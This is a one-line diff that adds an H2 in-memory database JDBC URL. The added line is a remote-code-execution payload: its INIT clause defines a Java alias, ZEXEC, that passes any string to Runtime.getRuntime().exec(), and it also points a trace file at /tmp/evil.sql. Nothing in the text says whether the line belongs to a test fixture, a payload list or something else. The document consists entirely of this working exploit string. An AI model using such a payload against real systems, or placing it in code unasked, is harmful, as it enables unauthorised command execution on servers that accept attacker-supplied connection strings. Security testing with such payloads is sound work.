@@ -1,0 +1,1 @@
+jdbc:h2:mem:testdb;TRACE_LEVEL_FILE=3;TRACE_FILE=/tmp/evil.sql;INIT=CREATE ALIAS ZEXEC AS 'String x(String c) throws Exception { Runtime.getRuntime().exec(c); return "1"; }'
